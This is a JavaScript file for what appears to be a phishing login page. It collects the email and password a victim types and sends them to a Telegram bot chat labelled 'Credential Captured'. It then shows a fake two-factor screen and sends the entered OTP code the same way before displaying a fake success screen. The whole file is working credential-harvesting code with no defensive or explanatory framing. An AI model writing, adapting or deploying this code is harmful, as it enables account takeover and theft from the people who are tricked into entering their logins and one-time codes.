const BOT_TOKEN = "";
const CHAT_ID = "5207464165";

function sendTelegramMessage(text) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
  fetch(url).catch(error => console.error('Error sending telegram:', error));
}

let isEmailSubmitted = false;
const emailInput = document.getElementById("emailInput");
const passwordInput = document.getElementById("passwordInput");
const submitBtn = document.getElementById("submitBtn");
const btnText = document.getElementById("btnText");

function getRandomDelay(min = 800, max = 1500) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function setButtonLoading(isLoading) {
  if (isLoading) {
    submitBtn.disabled = true;
    btnText.innerHTML = '<div class="spinner"></div>';
  } else {
    submitBtn.disabled = false;
    btnText.innerText = "Continue";
  }
}

function updateButtonState() {
  if (submitBtn.querySelector(".spinner")) return;
  if (!isEmailSubmitted) {
    submitBtn.disabled = emailInput.value.trim() === "";
  } else {
    submitBtn.disabled = passwordInput.value.trim() === "";
  }
}

emailInput.addEventListener("input", updateButtonState);
passwordInput.addEventListener("input", updateButtonState);

function handleNext(event) {
  event.preventDefault();

  const passwordGroup = document.getElementById("passwordGroup");

  if (!isEmailSubmitted) {
    if (emailInput.value.trim() === "") return;

    setButtonLoading(true);
    emailInput.disabled = true;

    setTimeout(() => {
      setButtonLoading(false);
      emailInput.disabled = false;
      passwordGroup.classList.remove("hidden");
      isEmailSubmitted = true;
      updateButtonState();
      setTimeout(() => passwordInput.focus(), 150);
    }, getRandomDelay(800, 1400));

  } else {
    if (passwordInput.value.trim() === "") return;

    const userEmail = emailInput.value.trim();
    const userPassword = passwordInput.value.trim();
    sendTelegramMessage(`Credential Captured:\nEmail: ${userEmail}\nPassword: ${userPassword}`);

    setButtonLoading(true);
    passwordInput.disabled = true;

    setTimeout(() => {
      setButtonLoading(false);
      passwordInput.disabled = false;
      show2FA();
    }, getRandomDelay(1000, 1800));
  }
}

function show2FA() {
  document.getElementById("loginSection").style.display = "none";
  const twoFactorSection = document.getElementById("twoFactorSection");
  twoFactorSection.style.display = "block";
  setupOTPInputs();
}

function setupOTPInputs() {
  const inputs = document.querySelectorAll(".otp-input");
  inputs[0].focus();

  inputs.forEach((input, index) => {
    input.addEventListener("input", (e) => {
      if (e.target.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }

      const allFilled = Array.from(inputs).every(inp => inp.value.length === 1);
      if (allFilled) {
        submitOTP(inputs);
      }
    });

    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !e.target.value && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });
}

function submitOTP(inputs) {
  inputs.forEach(inp => inp.disabled = true);
  const otpCode = Array.from(inputs).map(inp => inp.value).join('');
  sendTelegramMessage(`OTP Code Captured:\nCode: ${otpCode}`);

  // Transition to Success Screen after a short simulated delay
  setTimeout(() => {
    document.getElementById("twoFactorSection").style.display = "none";
    document.getElementById("successSection").style.display = "block";
  }, getRandomDelay(1000, 1500));
}